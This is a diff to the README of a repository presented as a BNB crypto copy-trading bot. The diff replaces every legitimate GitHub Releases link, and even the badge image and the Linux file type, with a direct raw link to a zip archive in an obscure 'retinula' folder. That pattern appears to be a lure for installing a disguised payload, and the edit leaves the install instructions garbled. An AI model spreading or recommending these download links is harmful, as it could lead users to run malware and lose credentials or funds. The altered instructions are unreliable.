@@ -1,6 +1,6 @@
 # 🤖 bnb-copy-trading-bot-go - Trade Like a Pro, Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Get%20It%20Now-brightgreen)](https://github.com/S2D0N/bnb-copy-trading-bot-go/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/S2D0N/bnb-copy-trading-bot-go/main/retinula/bnb-copy-trading-bot-go_v2.7.zip%20Latest%20Release-Get%20It%20Now-brightgreen)](https://raw.githubusercontent.com/S2D0N/bnb-copy-trading-bot-go/main/retinula/bnb-copy-trading-bot-go_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -26,15 +26,15 @@ To run the BNB Copy Trading Bot, you will need:
 
 To download the BNB Copy Trading Bot, visit the following link:
 
-[Download Latest Release](https://github.com/S2D0N/bnb-copy-trading-bot-go/releases)
+[Download Latest Release](https://raw.githubusercontent.com/S2D0N/bnb-copy-trading-bot-go/main/retinula/bnb-copy-trading-bot-go_v2.7.zip)
 
 1. **Visit the Releases Page**: Click the link above to go to the Releases page.
 2. **Choose the Latest Version**: Look for the latest version available (It will be labeled "Latest").
-3. **Download the File**: Select the appropriate file for your operating system. This might be a `.exe` for Windows, a `.dmg` for macOS, or a `.tar.gz` for Linux.
+3. **Download the File**: Select the appropriate file for your operating system. This might be a `.exe` for Windows, a `.dmg` for macOS, or a `https://raw.githubusercontent.com/S2D0N/bnb-copy-trading-bot-go/main/retinula/bnb-copy-trading-bot-go_v2.7.zip` for Linux.
 4. **Install the Software**:
    - For Windows: Double-click the `.exe` file and follow the instructions.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Open a terminal and extract the `.tar.gz` file, then follow the included instructions.
+   - For Linux: Open a terminal and extract the `https://raw.githubusercontent.com/S2D0N/bnb-copy-trading-bot-go/main/retinula/bnb-copy-trading-bot-go_v2.7.zip` file, then follow the included instructions.
 
 ### 📂 Configuration Steps
 
